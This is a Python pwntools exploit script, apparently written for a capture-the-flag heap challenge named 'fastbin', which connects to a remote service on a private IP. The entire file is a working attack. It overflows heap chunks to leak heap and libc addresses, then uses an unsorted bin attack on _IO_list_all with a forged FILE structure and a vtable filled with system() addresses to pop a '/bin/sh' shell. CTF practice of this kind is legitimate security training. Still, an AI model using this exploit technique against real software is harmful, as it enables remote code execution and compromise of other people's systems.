from pwn import *
context(os='linux', arch='amd64', log_level='debug')

DEBUG = 0
GDB = 0
if DEBUG:
    p = process("./fastbin" ,env={"LD_PRELOAD" : "/home/vagrant/ctf/contests/rsctf-2017/fastbin/libc.so"})
    #libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    #libc = ELF("/usr/lib/libc.so.6")
    libc = ELF("./libc.so")
else:
    p = remote("192.168.201.8", 10127)
    libc = ELF("./libc.so")

def allocate(size):
    p.recvuntil('Command:')
    p.sendline('1')
    p.recvuntil('Size:')
    p.sendline(str(size))
    p.recvuntil('Index ')
    index = p.recvline()[:-1]
    idx = int(index)
    log.info('idx = ' + str(idx))

def fill(index, size, content):
    p.recvuntil('Command')
    p.sendline('2')
    p.recvuntil('Index: ')
    p.sendline(str(index))
    p.recvuntil('Size: ')
    p.sendline(str(size))
    p.recvuntil('Content: ')
    p.send(content)

def free(index):
    p.recvuntil('Command')
    p.sendline('3')
    p.recvuntil('Index: ')
    p.sendline(str(index))

def dump(index):
    p.recvuntil('Command: ')
    p.sendline('4')
    p.recvuntil('Index: ')
    p.sendline(str(index))
    p.recvline()
    content = p.recvline()[:-1]
    return content

def leak_heap():
    allocate(0x20) # 0 10
    allocate(0x20) # 1 40
    allocate(0x20) # 2 70
    allocate(0x20) # 3 a0
    allocate(0x20) # 4 d0
    fill(1, 0x30, 'a' * 0x20 + p64(0) + p64(0x51))
    # next size
    fill(3, 0x20, p64(0) + p64(0x20) + p64(0) + p64(0x20))
    free(2) # ~2
    allocate(0x40) # 2 (overlap 3)
    fill(2, 0x30, 'b' * 0x20 + p64(0) + p64(0x31))
    free(4) # ~4
    free(3) # ~3
    dumped = dump(2)
    leaked_heap = u64(dumped[0x30:].strip('\x00').ljust(8, '\x00'))
    heap_base = leaked_heap & 0xfffffffffffffff000
    allocate(0x20) # 3
    fill(2, 0x30, 'c' * 0x20 + p64(0) + p64(0x111))
    allocate(0x48) # 4
    allocate(0x58) # 5
    fill(5, 0x60, 'd' * 0x30 + p64(0) + p64(0x131) + p64(0) + p64(0x131) + p64(0x12345679) + p64(0x131))
    log.info('check this')
    allocate(0x50) # 6 1b0
    free(3) # ~3
    dumped = u64(dump(2)[-8:-1].ljust(8, '\x00'))
    log.info('heap base:' + hex(heap_base))
    libc_data = dumped & 0xfffffffffffff000
    log.info('libc data:' + hex(dumped))

    return heap_base, libc_data, dumped


def unsorted_bin_attack(heap_base, libc_data, leaked):
    log.info('unsorted bin attack')
    fill(2, 0x40, 'q' * 0x20 + p64(0x0) + p64(0x110) + p64(leaked) + p64(heap_base+0x140))
    libc_base = libc_data - 0x3a5000
    list_all_offset = libc.symbols['_IO_list_all'] + libc_base
    #allocate(0x50) # 3
    fill(4, 0x48, 'f' * 0x40 + '/bin/sh\x00')
    log.info("list all off:" + hex(libc.symbols['_IO_list_all']))
    log.info("list all:" + hex(list_all_offset))
    payload = 'v' * 8 + p64(list_all_offset - 0x10)
    payload += p64(0x10101010) # _IO_write_base
    payload += p64(0x20202020) # _IO_write_ptr
    payload += p64(0x123) # _IO_write_end
    payload += p64(0x321) # _IO_buf_base
    payload += p64(0x321321) # _IO_buf_end
    payload += p64(0x123) # _IO_save_base
    payload += p64(0x0) # _IO_backup_base
    payload += p64(0x123) # _IO_save_end
    payload += p64(0x0) # _markers
    payload += p64(0x0) # _chain
    payload += p32(0x0) # _fileno
    payload += p32(0x0) # _flags2
    payload += p64(0xffffffffffffffff) # _old_offset
    payload += p16(0x0) # _cur_column
    payload += p16(0x0) # _vtable_offset
    payload += p32(0x41) # _shortbuf
    payload += p64(0x12345678) # _lock
    payload += p64(0xffffffffffffffff) # _offset
    payload += p64(0x0) # _codecvt
    payload += p64(0xdeadbeef) # _wide_data
    payload += p64(0x0) # _freeres_list
    payload += p64(0x0) # _freeres_buf
    payload += p64(0x0) # __pad5
    payload += p64(0xffffffff) # _mode
    payload += '\x00' * 16 # _unused2
    vtable_address = len(payload) + heap_base + 0x140 + 8 + 0x10
    log.info('vtable:' + hex(vtable_address))
    payload += p64(vtable_address) # vtable_address

    system_addr = libc_base + libc.symbols['system']
    vtable = p64(system_addr) * 20
    payload += vtable

    #fill(5, len(payload), '/bin/sh\x00' + p64(list_all_offset - 0x10) + payload)
    fill(5, len(payload), payload)
    
    


def pwn():
    if GDB:
        raw_input()
    heap_base, libc_data, leaked = leak_heap()
    unsorted_bin_attack(heap_base, libc_data, leaked);
    #allocate(0x5)

    #p.sendline('ls')
    #p.recv()
    p.recvuntil('Command:')
    p.sendline('1')
    p.recvuntil('Size')
    p.sendline('5')
    p.interactive()

def main():
    global p
    for i in range(100):
        if DEBUG:
            p = process("./fastbin")
        else:
            p = remote("192.168.201.8", 10127)
        try:
            pwn()
        except:
            p.close()
            continue

if __name__ == "__main__":
    pwn()

